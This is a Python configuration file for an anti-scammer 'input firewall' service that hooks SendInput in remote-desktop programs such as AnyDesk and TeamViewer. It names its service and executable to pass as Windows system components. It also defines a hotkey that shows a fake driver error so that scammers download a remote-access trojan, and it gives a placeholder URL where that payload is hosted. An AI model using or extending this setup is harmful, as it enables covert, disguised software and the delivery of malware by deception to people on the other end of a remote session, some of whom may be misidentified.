"""
Configuration for Blackhole Input Firewall Service
"""

# ============================================================================
# SERVICE CONFIGURATION
# ============================================================================

# Service name for Task Scheduler (disguised as Windows system task)
SERVICE_NAME = "MicrosoftEdgeUpdateTaskMachineCore"

# Executable name (disguised as legitimate Windows process)
EXE_NAME = "taskhostw.exe"

# Default state on startup (True = firewall ON, block remote input)
DEFAULT_FIREWALL_STATE = True

# ============================================================================
# API HOOKING CONFIGURATION
# ============================================================================

# Magic tag value used to mark input from hooked remote desktop processes
# This value is written to dwExtraInfo field of INPUT structures
MAGIC_TAG = 0xDEADBEEF

# Target processes to hook (remote desktop applications)
# The service will automatically detect and hook SendInput() in these processes
TARGET_PROCESSES = [
    "AnyDesk.exe",
    "TeamViewer.exe",
    "RemotePC.exe",
    "Chrome Remote Desktop.exe",
    "LogMeIn.exe",
    "GoToMyPC.exe",
    "Splashtop.exe",
]

# ============================================================================
# PROCESS MONITOR CONFIGURATION
# ============================================================================

# How often to scan for target processes (seconds)
PROCESS_SCAN_INTERVAL = 2.0

# ============================================================================
# HOTKEY CONFIGURATION
# ============================================================================

# Hotkey to toggle firewall on/off (Windows+Shift+F)
# Format: pynput hotkey string format
# Note: <cmd> is the Windows key on Windows, Command key on Mac
TOGGLE_HOTKEY = "<cmd>+<shift>+f"

# Hotkey to trigger fake driver error (Windows+Shift+G)
# This is a social engineering trick to get scammers to download the RAT
DRIVER_ERROR_HOTKEY = "<cmd>+<shift>+g"

# URL where the "driver" (RAT payload) is hosted
DRIVER_DOWNLOAD_URL = "https://your-domain.com/drivers/remote-desktop-driver.exe"
